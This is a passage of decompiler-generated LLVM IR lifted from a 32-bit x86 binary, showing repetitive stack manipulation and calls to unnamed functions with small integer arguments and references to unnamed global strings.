  %v1_80487bb = add i32 %v0_80487ba, 10388
  store i32 %v1_80487bb, i32* %ecx.global-to-local, align 4
  store i32 %v1_80487bb, i32* %v1_80487ba, align 4
  %v2_80487c3 = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_80487c3, i32* %eax.global-to-local, align 4
  %v0_80487c8 = load i32, i32* @esp, align 4
  %v1_80487c8 = inttoptr i32 %v0_80487c8 to i32*
  %v2_80487c8 = load i32, i32* %v1_80487c8, align 4
  store i32 %v2_80487c8, i32* %edx.global-to-local, align 4
  %v3_80487c8 = add i32 %v0_80487c8, 4
  %v1_80487c9 = inttoptr i32 %v3_80487c8 to i32*
  %v2_80487c9 = load i32, i32* %v1_80487c9, align 4
  store i32 %v2_80487c9, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_8054b2f.8 to i32), i32* %v1_80487c9, align 4
  %v1_80487cf = add i32 %v0_80487c8, 10388
  store i32 %v1_80487cf, i32* %edx.global-to-local, align 4
  %v2_80487d6 = add i32 %v1_80487cf, %v2_80487c3
  store i32 %v2_80487d6, i32* %eax.global-to-local, align 4
  store i32 %v2_80487d6, i32* %v1_80487c8, align 4
  %v3_80487da = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80487da, i32* %eax.global-to-local, align 4
  %v0_80487df = load i32, i32* @esp, align 4
  %v1_80487df = inttoptr i32 %v0_80487df to i32*
  %v2_80487df = load i32, i32* %v1_80487df, align 4
  store i32 %v2_80487df, i32* @ebx, align 4
  %v1_80487e0 = add i32 %v0_80487df, 10388
  store i32 %v1_80487e0, i32* %ecx.global-to-local, align 4
  store i32 %v1_80487e0, i32* %v1_80487df, align 4
  %v2_80487e8 = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_80487e8, i32* %eax.global-to-local, align 4
  %v0_80487ed = load i32, i32* @esp, align 4
  %v1_80487ed = inttoptr i32 %v0_80487ed to i32*
  %v3_80487ed = add i32 %v0_80487ed, 4
  %v0_80487ee = load i32, i32* @edi, align 4
  %v1_80487ee = add i32 %v0_80487ee, 20
  store i32 %v1_80487ee, i32* %edx.global-to-local, align 4
  %v1_80487f1 = inttoptr i32 %v3_80487ed to i32*
  %v2_80487f1 = load i32, i32* %v1_80487f1, align 4
  store i32 %v2_80487f1, i32* %ecx.global-to-local, align 4
  store i32 %v1_80487ee, i32* %v1_80487f1, align 4
  %v1_80487f3 = add i32 %v0_80487ed, 10388
  store i32 %v1_80487f3, i32* %edx.global-to-local, align 4
  %v2_80487fa = add i32 %v1_80487f3, %v2_80487e8
  store i32 %v2_80487fa, i32* %eax.global-to-local, align 4
  store i32 %v2_80487fa, i32* %v1_80487ed, align 4
  %v3_80487fe = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80487fe, i32* %eax.global-to-local, align 4
  %v0_8048803 = load i32, i32* @esp, align 4
  %v1_8048803 = inttoptr i32 %v0_8048803 to i32*
  %v2_8048803 = load i32, i32* %v1_8048803, align 4
  store i32 %v2_8048803, i32* @ebx, align 4
  %v1_8048804 = add i32 %v0_8048803, 10388
  store i32 %v1_8048804, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048804, i32* %v1_8048803, align 4
  %v2_804880c = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_804880c, i32* %eax.global-to-local, align 4
  %v0_8048811 = load i32, i32* @esp, align 4
  %v1_8048811 = inttoptr i32 %v0_8048811 to i32*
  %v2_8048811 = load i32, i32* %v1_8048811, align 4
  store i32 %v2_8048811, i32* %edx.global-to-local, align 4
  %v3_8048811 = add i32 %v0_8048811, 4
  %v1_8048812 = inttoptr i32 %v3_8048811 to i32*
  %v2_8048812 = load i32, i32* %v1_8048812, align 4
  store i32 %v2_8048812, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_8054b47.9 to i32), i32* %v1_8048812, align 4
  %v1_8048818 = add i32 %v0_8048811, 10388
  store i32 %v1_8048818, i32* %edx.global-to-local, align 4
  %v2_804881f = add i32 %v1_8048818, %v2_804880c
  store i32 %v2_804881f, i32* %eax.global-to-local, align 4
  store i32 %v2_804881f, i32* %v1_8048811, align 4
  %v3_8048823 = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048823, i32* %eax.global-to-local, align 4
  %v0_8048828 = load i32, i32* @esp, align 4
  %v1_8048828 = inttoptr i32 %v0_8048828 to i32*
  %v2_8048828 = load i32, i32* %v1_8048828, align 4
  store i32 %v2_8048828, i32* @ebx, align 4
  %v1_8048829 = add i32 %v0_8048828, 10388
  store i32 %v1_8048829, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048829, i32* %v1_8048828, align 4
  %v2_8048831 = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8048831, i32* %eax.global-to-local, align 4
  %v0_8048836 = load i32, i32* @esp, align 4
  %v1_8048836 = inttoptr i32 %v0_8048836 to i32*
  %v3_8048836 = add i32 %v0_8048836, 4
  %v0_8048837 = load i32, i32* @edi, align 4
  %v1_8048837 = add i32 %v0_8048837, 789
  store i32 %v1_8048837, i32* %edx.global-to-local, align 4
  %v1_804883d = inttoptr i32 %v3_8048836 to i32*
  %v2_804883d = load i32, i32* %v1_804883d, align 4
  store i32 %v2_804883d, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048837, i32* %v1_804883d, align 4
  %v1_804883f = add i32 %v0_8048836, 10388
  store i32 %v1_804883f, i32* %edx.global-to-local, align 4
  %v2_8048846 = add i32 %v1_804883f, %v2_8048831
  store i32 %v2_8048846, i32* %eax.global-to-local, align 4
  store i32 %v2_8048846, i32* %v1_8048836, align 4
  %v3_804884a = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804884a, i32* %eax.global-to-local, align 4
  %v0_804884f = load i32, i32* @esp, align 4
  %v1_804884f = inttoptr i32 %v0_804884f to i32*
  %v2_804884f = load i32, i32* %v1_804884f, align 4
  store i32 %v2_804884f, i32* %eax.global-to-local, align 4
  %v1_8048850 = add i32 %v0_804884f, 10388
  store i32 %v1_8048850, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048850, i32* %v1_804884f, align 4
  %v2_8048858 = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8048858, i32* %eax.global-to-local, align 4
  %v0_804885d = load i32, i32* @esp, align 4
  %v1_804885d = inttoptr i32 %v0_804885d to i32*
  %v2_804885d = load i32, i32* %v1_804885d, align 4
  store i32 %v2_804885d, i32* %ecx.global-to-local, align 4
  %v3_804885d = add i32 %v0_804885d, 4
  %v1_804885e = inttoptr i32 %v3_804885d to i32*
  %v2_804885e = load i32, i32* %v1_804885e, align 4
  store i32 %v2_804885e, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8054b66.10 to i32), i32* %v1_804885e, align 4
  %v1_8048864 = add i32 %v0_804885d, 10388
  store i32 %v1_8048864, i32* %edx.global-to-local, align 4
  %v2_804886b = add i32 %v1_8048864, %v2_8048858
  store i32 %v2_804886b, i32* %eax.global-to-local, align 4
  store i32 %v2_804886b, i32* %v1_804885d, align 4
  %v3_804886f = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804886f, i32* %eax.global-to-local, align 4
  %v0_8048874 = load i32, i32* @esp, align 4
  %v1_8048874 = inttoptr i32 %v0_8048874 to i32*
  store i32 32, i32* %v1_8048874, align 4
  %v2_804887b = call i32 @function_8051350(i8 %v1_804887b)
  store i32 %v2_804887b, i32* %eax.global-to-local, align 4
  %v0_8048880 = load i32, i32* @esp, align 4
  %v1_8048880 = inttoptr i32 %v0_8048880 to i32*
  %v2_8048880 = load i32, i32* %v1_8048880, align 4
  store i32 %v2_8048880, i32* %eax.global-to-local, align 4
  %v3_8048880 = add i32 %v0_8048880, 4
  %v1_8048881 = inttoptr i32 %v3_8048880 to i32*
  %v2_8048881 = load i32, i32* %v1_8048881, align 4
  store i32 %v2_8048881, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8048881, align 4
  store i32 32, i32* %v1_8048880, align 4
  %v3_8048886 = call i32 @function_80512a0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048886, i32* %eax.global-to-local, align 4
  store i32 %v3_8048886, i32* @ebx, align 4
  %v0_804888d = load i32, i32* @esp, align 4
  %v1_804888d = inttoptr i32 %v0_804888d to i32*
  %v2_804888d = load i32, i32* %v1_804888d, align 4
  store i32 %v2_804888d, i32* %eax.global-to-local, align 4
  %v1_804888e = add i32 %v0_804888d, 10388
  store i32 %v1_804888e, i32* %ecx.global-to-local, align 4
  store i32 %v1_804888e, i32* %v1_804888d, align 4
  %v2_8048896 = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8048896, i32* %eax.global-to-local, align 4
  %v0_804889b = load i32, i32* @esp, align 4
  %v1_804889b = inttoptr i32 %v0_804889b to i32*
  %v2_804889b = load i32, i32* %v1_804889b, align 4
  store i32 %v2_804889b, i32* %edx.global-to-local, align 4
  %v3_804889b = add i32 %v0_804889b, 4
  %v1_804889c = inttoptr i32 %v3_804889b to i32*
  %v2_804889c = load i32, i32* %v1_804889c, align 4
  store i32 %v2_804889c, i32* %ecx.global-to-local, align 4
  %v0_804889d = load i32, i32* @ebx, align 4
  store i32 %v0_804889d, i32* %v1_804889c, align 4
  %v1_804889e = add i32 %v0_804889b, 10388
  store i32 %v1_804889e, i32* %edx.global-to-local, align 4
  %v2_80488a5 = add i32 %v1_804889e, %v2_8048896
  store i32 %v2_80488a5, i32* %eax.global-to-local, align 4
  store i32 %v2_80488a5, i32* %v1_804889b, align 4
  %v3_80488a9 = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80488a9, i32* %eax.global-to-local, align 4
  %v0_80488ae = load i32, i32* @esp, align 4
  %v1_80488ae = inttoptr i32 %v0_80488ae to i32*
  store i32 32, i32* %v1_80488ae, align 4
  %v2_80488b5 = call i32 @function_80512d0(i8 %v1_804887b)
  store i32 %v2_80488b5, i32* %eax.global-to-local, align 4
  %v0_80488ba = load i32, i32* @esp, align 4
  %v1_80488ba = inttoptr i32 %v0_80488ba to i32*
  %v2_80488ba = load i32, i32* %v1_80488ba, align 4
  store i32 %v2_80488ba, i32* %eax.global-to-local, align 4
  %v1_80488bb = add i32 %v0_80488ba, 10388
  store i32 %v1_80488bb, i32* %ecx.global-to-local, align 4
  store i32 %v1_80488bb, i32* %v1_80488ba, align 4
  %v2_80488c3 = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_80488c3, i32* %eax.global-to-local, align 4
  %v0_80488c8 = load i32, i32* @esp, align 4
  %v1_80488c8 = inttoptr i32 %v0_80488c8 to i32*
  %v2_80488c8 = load i32, i32* %v1_80488c8, align 4
  store i32 %v2_80488c8, i32* %ecx.global-to-local, align 4
  %v3_80488c8 = add i32 %v0_80488c8, 4
  %v1_80488c9 = inttoptr i32 %v3_80488c8 to i32*
  %v2_80488c9 = load i32, i32* %v1_80488c9, align 4
  store i32 %v2_80488c9, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8054b66.10 to i32), i32* %v1_80488c9, align 4
  %v1_80488cf = add i32 %v0_80488c8, 10388
  store i32 %v1_80488cf, i32* %edx.global-to-local, align 4
  %v2_80488d6 = add i32 %v1_80488cf, %v2_80488c3
  store i32 %v2_80488d6, i32* %eax.global-to-local, align 4
  store i32 %v2_80488d6, i32* %v1_80488c8, align 4
  %v3_80488da = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80488da, i32* %eax.global-to-local, align 4
  %v0_80488df = load i32, i32* @esp, align 4
  %v1_80488df = inttoptr i32 %v0_80488df to i32*
  store i32 33, i32* %v1_80488df, align 4
  %v2_80488e6 = call i32 @function_8051350(i8 %v1_804887b)
  store i32 %v2_80488e6, i32* %eax.global-to-local, align 4
  %v0_80488eb = load i32, i32* @esp, align 4
  %v1_80488eb = inttoptr i32 %v0_80488eb to i32*
  %v2_80488eb = load i32, i32* %v1_80488eb, align 4
  store i32 %v2_80488eb, i32* %eax.global-to-local, align 4
  %v3_80488eb = add i32 %v0_80488eb, 4
  %v1_80488ec = inttoptr i32 %v3_80488eb to i32*
  %v2_80488ec = load i32, i32* %v1_80488ec, align 4
  store i32 %v2_80488ec, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_80488ec, align 4
  store i32 33, i32* %v1_80488eb, align 4
  %v3_80488f1 = call i32 @function_80512a0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80488f1, i32* %eax.global-to-local, align 4
  store i32 %v3_80488f1, i32* @ebx, align 4
  %v0_80488f8 = load i32, i32* @esp, align 4
  %v1_80488f8 = inttoptr i32 %v0_80488f8 to i32*
  %v2_80488f8 = load i32, i32* %v1_80488f8, align 4
  store i32 %v2_80488f8, i32* %eax.global-to-local, align 4
  %v1_80488f9 = add i32 %v0_80488f8, 10388
  store i32 %v1_80488f9, i32* %ecx.global-to-local, align 4
  store i32 %v1_80488f9, i32* %v1_80488f8, align 4
  %v2_8048901 = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8048901, i32* %eax.global-to-local, align 4
  %v0_8048906 = load i32, i32* @esp, align 4
  %v1_8048906 = inttoptr i32 %v0_8048906 to i32*
  %v2_8048906 = load i32, i32* %v1_8048906, align 4
  store i32 %v2_8048906, i32* %edx.global-to-local, align 4
  %v3_8048906 = add i32 %v0_8048906, 4
  %v1_8048907 = inttoptr i32 %v3_8048906 to i32*
  %v2_8048907 = load i32, i32* %v1_8048907, align 4
  store i32 %v2_8048907, i32* %ecx.global-to-local, align 4
  %v0_8048908 = load i32, i32* @ebx, align 4
  store i32 %v0_8048908, i32* %v1_8048907, align 4
  %v1_8048909 = add i32 %v0_8048906, 10388
  store i32 %v1_8048909, i32* %edx.global-to-local, align 4
  %v2_8048910 = add i32 %v1_8048909, %v2_8048901
  store i32 %v2_8048910, i32* %eax.global-to-local, align 4
  store i32 %v2_8048910, i32* %v1_8048906, align 4
  %v3_8048914 = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048914, i32* %eax.global-to-local, align 4
  %v0_8048919 = load i32, i32* @esp, align 4
  %v1_8048919 = inttoptr i32 %v0_8048919 to i32*
  store i32 33, i32* %v1_8048919, align 4
  %v2_8048920 = call i32 @function_80512d0(i8 %v1_804887b)
  store i32 %v2_8048920, i32* %eax.global-to-local, align 4
  %v0_8048925 = load i32, i32* @esp, align 4
  %v1_8048925 = inttoptr i32 %v0_8048925 to i32*
  %v2_8048925 = load i32, i32* %v1_8048925, align 4
  store i32 %v2_8048925, i32* %eax.global-to-local, align 4
  %v1_8048926 = add i32 %v0_8048925, 10388
  store i32 %v1_8048926, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048926, i32* %v1_8048925, align 4
  %v2_804892e = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_804892e, i32* %eax.global-to-local, align 4
  %v0_8048933 = load i32, i32* @esp, align 4
  %v1_8048933 = inttoptr i32 %v0_8048933 to i32*
  %v2_8048933 = load i32, i32* %v1_8048933, align 4
  store i32 %v2_8048933, i32* %ecx.global-to-local, align 4
  %v3_8048933 = add i32 %v0_8048933, 4
  %v1_8048934 = inttoptr i32 %v3_8048933 to i32*
  %v2_8048934 = load i32, i32* %v1_8048934, align 4
  store i32 %v2_8048934, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8054b66.10 to i32), i32* %v1_8048934, align 4
  %v1_804893a = add i32 %v0_8048933, 10388
  store i32 %v1_804893a, i32* %edx.global-to-local, align 4
  %v2_8048941 = add i32 %v1_804893a, %v2_804892e
  store i32 %v2_8048941, i32* %eax.global-to-local, align 4
  store i32 %v2_8048941, i32* %v1_8048933, align 4
  %v3_8048945 = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048945, i32* %eax.global-to-local, align 4
  %v0_804894a = load i32, i32* @esp, align 4
  %v1_804894a = inttoptr i32 %v0_804894a to i32*
  store i32 34, i32* %v1_804894a, align 4
  %v2_8048951 = call i32 @function_8051350(i8 %v1_804887b)
  store i32 %v2_8048951, i32* %eax.global-to-local, align 4
  %v0_8048956 = load i32, i32* @esp, align 4
  %v1_8048956 = inttoptr i32 %v0_8048956 to i32*
  %v2_8048956 = load i32, i32* %v1_8048956, align 4
  store i32 %v2_8048956, i32* %eax.global-to-local, align 4
  %v3_8048956 = add i32 %v0_8048956, 4
  %v1_8048957 = inttoptr i32 %v3_8048956 to i32*
  %v2_8048957 = load i32, i32* %v1_8048957, align 4
  store i32 %v2_8048957, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8048957, align 4
  store i32 34, i32* %v1_8048956, align 4
  %v3_804895c = call i32 @function_80512a0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_804895c, i32* %eax.global-to-local, align 4
  store i32 %v3_804895c, i32* @ebx, align 4
  %v0_8048963 = load i32, i32* @esp, align 4
  %v1_8048963 = inttoptr i32 %v0_8048963 to i32*
  %v2_8048963 = load i32, i32* %v1_8048963, align 4
  store i32 %v2_8048963, i32* %eax.global-to-local, align 4
  %v1_8048964 = add i32 %v0_8048963, 10388
  store i32 %v1_8048964, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048964, i32* %v1_8048963, align 4
  %v2_804896c = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_804896c, i32* %eax.global-to-local, align 4
  %v0_8048971 = load i32, i32* @esp, align 4
  %v1_8048971 = inttoptr i32 %v0_8048971 to i32*
  %v2_8048971 = load i32, i32* %v1_8048971, align 4
  store i32 %v2_8048971, i32* %edx.global-to-local, align 4
  %v3_8048971 = add i32 %v0_8048971, 4
  %v1_8048972 = inttoptr i32 %v3_8048971 to i32*
  %v2_8048972 = load i32, i32* %v1_8048972, align 4
  store i32 %v2_8048972, i32* %ecx.global-to-local, align 4
  %v0_8048973 = load i32, i32* @ebx, align 4
  store i32 %v0_8048973, i32* %v1_8048972, align 4
  %v1_8048974 = add i32 %v0_8048971, 10388
  store i32 %v1_8048974, i32* %edx.global-to-local, align 4
  %v2_804897b = add i32 %v1_8048974, %v2_804896c
  store i32 %v2_804897b, i32* %eax.global-to-local, align 4
  store i32 %v2_804897b, i32* %v1_8048971, align 4
  %v3_804897f = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804897f, i32* %eax.global-to-local, align 4
  %v0_8048984 = load i32, i32* @esp, align 4
  %v1_8048984 = inttoptr i32 %v0_8048984 to i32*
  store i32 34, i32* %v1_8048984, align 4
  %v2_804898b = call i32 @function_80512d0(i8 %v1_804887b)
  store i32 %v2_804898b, i32* %eax.global-to-local, align 4
  %v0_8048990 = load i32, i32* @esp, align 4
  %v1_8048990 = inttoptr i32 %v0_8048990 to i32*
  %v1_8048991 = add i32 %v0_8048990, 10388
  store i32 %v1_8048991, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048991, i32* %v1_8048990, align 4
  %v2_8048999 = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8048999, i32* %eax.global-to-local, align 4
  %v0_804899e = load i32, i32* @esp, align 4
  %v1_804899e = inttoptr i32 %v0_804899e to i32*
  %v2_804899e = load i32, i32* %v1_804899e, align 4
  store i32 %v2_804899e, i32* @ebx, align 4
  %v3_804899e = add i32 %v0_804899e, 4
  %v1_804899f = inttoptr i32 %v3_804899e to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b66.10 to i32), i32* %v1_804899f, align 4
  %v1_80489a5 = add i32 %v0_804899e, 10388
  store i32 %v1_80489a5, i32* %edx.global-to-local, align 4
  %v2_80489ac = add i32 %v1_80489a5, %v2_8048999
  store i32 %v2_80489ac, i32* %eax.global-to-local, align 4
  store i32 %v2_80489ac, i32* %v1_804899e, align 4
  %v3_80489b0 = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80489b0, i32* %eax.global-to-local, align 4
  %v0_80489b5 = load i32, i32* @esp, align 4
  %v1_80489b5 = add i32 %v0_80489b5, 16
  %v1_80489b8 = add i32 %v0_80489b5, 68
  %v2_80489b8 = inttoptr i32 %v1_80489b8 to i32*
  %v3_80489b8 = load i32, i32* %v2_80489b8, align 4
  store i32 %v3_80489b8, i32* %ecx.global-to-local, align 4
  %v1_80489bc = icmp eq i32 %v3_80489b8, 0
  store i1 %v1_80489bc, i1* %zf.global-to-local, align 1
  br i1 %v1_80489bc, label %dec_label_pc_8048ad8, label %dec_label_pc_80489c4

dec_label_pc_80489c4:                             ; preds = %dec_label_pc_8048700
  %v9_80489c4 = icmp eq i32 %v0_80489b5, -4
  store i1 %v9_80489c4, i1* %zf.global-to-local, align 1
  %v2_80489c7 = inttoptr i32 %v0_80489b5 to i32*
  store i32 35, i32* %v2_80489c7, align 4
  %v2_80489c9 = call i32 @function_8051350(i8 %v1_804887b)
  store i32 %v2_80489c9, i32* %eax.global-to-local, align 4
  %v0_80489ce = load i32, i32* @esp, align 4
  %v1_80489ce = inttoptr i32 %v0_80489ce to i32*
  %v2_80489ce = load i32, i32* %v1_80489ce, align 4
  store i32 %v2_80489ce, i32* %eax.global-to-local, align 4
  %v3_80489ce = add i32 %v0_80489ce, 4
  %v1_80489cf = inttoptr i32 %v3_80489ce to i32*
  %v2_80489cf = load i32, i32* %v1_80489cf, align 4
  store i32 %v2_80489cf, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_80489cf, align 4
  store i32 35, i32* %v1_80489ce, align 4
  %v3_80489d4 = call i32 @function_80512a0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80489d4, i32* %eax.global-to-local, align 4
  store i32 %v3_80489d4, i32* @ebx, align 4
  %v0_80489db = load i32, i32* @esp, align 4
  %v1_80489db = inttoptr i32 %v0_80489db to i32*
  %v2_80489db = load i32, i32* %v1_80489db, align 4
  store i32 %v2_80489db, i32* %eax.global-to-local, align 4
  %v1_80489dc = add i32 %v0_80489db, 10388
  store i32 %v1_80489dc, i32* %ecx.global-to-local, align 4
  store i32 %v1_80489dc, i32* %v1_80489db, align 4
  %v2_80489e4 = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_80489e4, i32* %eax.global-to-local, align 4
  %v0_80489e9 = load i32, i32* @esp, align 4
  %v1_80489e9 = inttoptr i32 %v0_80489e9 to i32*
  %v2_80489e9 = load i32, i32* %v1_80489e9, align 4
  store i32 %v2_80489e9, i32* %edx.global-to-local, align 4
  %v3_80489e9 = add i32 %v0_80489e9, 4
  %v1_80489ea = inttoptr i32 %v3_80489e9 to i32*
  %v2_80489ea = load i32, i32* %v1_80489ea, align 4
  store i32 %v2_80489ea, i32* %ecx.global-to-local, align 4
  %v0_80489eb = load i32, i32* @ebx, align 4
  store i32 %v0_80489eb, i32* %v1_80489ea, align 4
  %v1_80489ec = add i32 %v0_80489e9, 10388
  store i32 %v1_80489ec, i32* %edx.global-to-local, align 4
  %v2_80489f3 = add i32 %v1_80489ec, %v2_80489e4
  store i32 %v2_80489f3, i32* %eax.global-to-local, align 4
  store i32 %v2_80489f3, i32* %v1_80489e9, align 4
  %v3_80489f7 = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80489f7, i32* %eax.global-to-local, align 4
  %v0_80489fc = load i32, i32* @esp, align 4
  %v1_80489fc = inttoptr i32 %v0_80489fc to i32*
  store i32 35, i32* %v1_80489fc, align 4
  %v2_8048a03 = call i32 @function_80512d0(i8 %v1_804887b)
  store i32 %v2_8048a03, i32* %eax.global-to-local, align 4
  %v0_8048a08 = load i32, i32* @esp, align 4
  %v1_8048a08 = inttoptr i32 %v0_8048a08 to i32*
  %v2_8048a08 = load i32, i32* %v1_8048a08, align 4
  store i32 %v2_8048a08, i32* %eax.global-to-local, align 4
  %v1_8048a09 = add i32 %v0_8048a08, 10388
  store i32 %v1_8048a09, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048a09, i32* %v1_8048a08, align 4
  %v2_8048a11 = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8048a11, i32* %eax.global-to-local, align 4
  %v0_8048a16 = load i32, i32* @esp, align 4
  %v1_8048a16 = inttoptr i32 %v0_8048a16 to i32*
  %v2_8048a16 = load i32, i32* %v1_8048a16, align 4
  store i32 %v2_8048a16, i32* %ecx.global-to-local, align 4
  %v3_8048a16 = add i32 %v0_8048a16, 4
  %v1_8048a17 = inttoptr i32 %v3_8048a16 to i32*
  %v2_8048a17 = load i32, i32* %v1_8048a17, align 4
  store i32 %v2_8048a17, i32* @ebx, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8054b66.10 to i32), i32* %v1_8048a17, align 4
  %v1_8048a1d = add i32 %v0_8048a16, 10388
  store i32 %v1_8048a1d, i32* %edx.global-to-local, align 4
  %v2_8048a24 = add i32 %v1_8048a1d, %v2_8048a11
  store i32 %v2_8048a24, i32* %eax.global-to-local, align 4
  store i32 %v2_8048a24, i32* %v1_8048a16, align 4
  %v3_8048a28 = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048a28, i32* %eax.global-to-local, align 4
  %v0_8048a2d = load i32, i32* @esp, align 4
  %v1_8048a2d = inttoptr i32 %v0_8048a2d to i32*
  %v2_8048a2d = load i32, i32* %v1_8048a2d, align 4
  store i32 %v2_8048a2d, i32* %eax.global-to-local, align 4
  %v3_8048a2d = add i32 %v0_8048a2d, 4
  %v1_8048a2e = inttoptr i32 %v3_8048a2d to i32*
  %v2_8048a2e = load i32, i32* %v1_8048a2e, align 4
  store i32 %v2_8048a2e, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8048a2e, align 4
  store i32 40, i32* %v1_8048a2d, align 4
  %v3_8048a33 = call i32 @function_80512a0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048a33, i32* %eax.global-to-local, align 4
  store i32 %v3_8048a33, i32* @ebx, align 4
  %v0_8048a3a = load i32, i32* @esp, align 4
  %v1_8048a3a = inttoptr i32 %v0_8048a3a to i32*
  %v2_8048a3a = load i32, i32* %v1_8048a3a, align 4
  store i32 %v2_8048a3a, i32* %eax.global-to-local, align 4
  %v1_8048a3b = add i32 %v0_8048a3a, 10388
  store i32 %v1_8048a3b, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048a3b, i32* %v1_8048a3a, align 4
  %v2_8048a43 = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8048a43, i32* %eax.global-to-local, align 4
  %v0_8048a48 = load i32, i32* @esp, align 4
  %v1_8048a48 = inttoptr i32 %v0_8048a48 to i32*
  %v2_8048a48 = load i32, i32* %v1_8048a48, align 4
  store i32 %v2_8048a48, i32* %edx.global-to-local, align 4
  %v3_8048a48 = add i32 %v0_8048a48, 4
  %v1_8048a49 = inttoptr i32 %v3_8048a48 to i32*
  %v2_8048a49 = load i32, i32* %v1_8048a49, align 4
  store i32 %v2_8048a49, i32* %ecx.global-to-local, align 4
  %v0_8048a4a = load i32, i32* @ebx, align 4
  store i32 %v0_8048a4a, i32* %v1_8048a49, align 4
  %v1_8048a4b = add i32 %v0_8048a48, 10388
  store i32 %v1_8048a4b, i32* %edx.global-to-local, align 4
  %v2_8048a52 = add i32 %v1_8048a4b, %v2_8048a43
  store i32 %v2_8048a52, i32* %eax.global-to-local, align 4
  store i32 %v2_8048a52, i32* %v1_8048a48, align 4
  %v3_8048a56 = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048a56, i32* %eax.global-to-local, align 4
  %v0_8048a5b = load i32, i32* @esp, align 4
  %v1_8048a5b = inttoptr i32 %v0_8048a5b to i32*
  %v2_8048a5b = load i32, i32* %v1_8048a5b, align 4
  store i32 %v2_8048a5b, i32* @ebx, align 4
  %v1_8048a5c = add i32 %v0_8048a5b, 10388
  store i32 %v1_8048a5c, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048a5c, i32* %v1_8048a5b, align 4
  %v2_8048a64 = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_8048a64, i32* %eax.global-to-local, align 4
  %v0_8048a69 = load i32, i32* @esp, align 4
  %v1_8048a69 = inttoptr i32 %v0_8048a69 to i32*
  %v2_8048a69 = load i32, i32* %v1_8048a69, align 4
  store i32 %v2_8048a69, i32* %edx.global-to-local, align 4
  %v3_8048a69 = add i32 %v0_8048a69, 4
  %v1_8048a6a = inttoptr i32 %v3_8048a69 to i32*
  %v2_8048a6a = load i32, i32* %v1_8048a6a, align 4
  store i32 %v2_8048a6a, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8054b5f.7 to i32), i32* %v1_8048a6a, align 4
  %v1_8048a70 = add i32 %v0_8048a69, 10388
  store i32 %v1_8048a70, i32* %edx.global-to-local, align 4
  %v2_8048a77 = add i32 %v1_8048a70, %v2_8048a64
  store i32 %v2_8048a77, i32* %eax.global-to-local, align 4
  store i32 %v2_8048a77, i32* %v1_8048a69, align 4
  %v3_8048a7b = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
